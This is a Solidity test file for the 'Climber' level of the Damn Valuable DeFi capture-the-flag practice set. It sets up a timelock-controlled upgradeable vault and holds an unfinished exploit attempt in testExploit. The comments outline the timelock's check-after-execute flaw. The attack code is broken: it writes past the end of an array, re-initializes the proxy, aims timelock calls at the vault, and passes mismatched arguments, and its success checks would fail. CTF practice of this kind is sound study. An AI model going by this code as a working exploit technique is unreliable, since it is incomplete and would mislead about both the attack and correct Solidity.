// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature(
            "initialize(address,address,address)",
            deployer,
            proposer,
            sweeper
        );
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(
            ClimberVault(address(climberVaultProxy)).getSweeper(),
            sweeper
        );

        assertGt(
            ClimberVault(address(climberVaultProxy))
                .getLastWithdrawalTimestamp(),
            0
        );

        climberTimelock = ClimberTimelock(
            payable(ClimberVault(address(climberVaultProxy)).owner())
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer)
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer)
        );

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // on first glance, we only check readyforexecution after we have already run the code.
        // this means that we can make a call to update the delay to be 0 - immediately executable.
        // then we can call oneself to add the operation at an operation id

        ClimberVault(address(climberVaultProxy)).initialize(
            address(this),
            address(this),
            address(this)
        );

        console.log("here");

        uint8 len = 2;
        address[] memory targets = new address[](len);
        targets[0] = address(climberVaultProxy);
        targets[1] = address(climberVaultProxy);

        uint256[] memory _values = new uint256[](len);

        bytes[] memory datas = new bytes[](len);
        datas[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        datas[1] = abi.encodeWithSignature(
            "_setupRole(bytes32,address)",
            climberTimelock.PROPOSER_ROLE(),
            address(climberTimelock)
        );
        datas[2] = abi.encodeWithSignature(
            "schedule(address[],uint256[],bytes[],bytes32)", //??
            climberTimelock.PROPOSER_ROLE(),
            address(climberTimelock)
        );

        bytes32 salt = bytes32("hi");

        bytes32 hash = climberTimelock.getOperationId(
            targets,
            _values,
            datas,
            salt
        );
        console.log("bytes32 = %s", vm.toString(hash));

        // then we can again call oneself to

        // so we can ask the timelock contract to upgrade the logic contract to a new implementation:
        // this implementation will just have one method - transfer to a specific address(lets prevent frontrunning):)

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(
            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
        );
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}
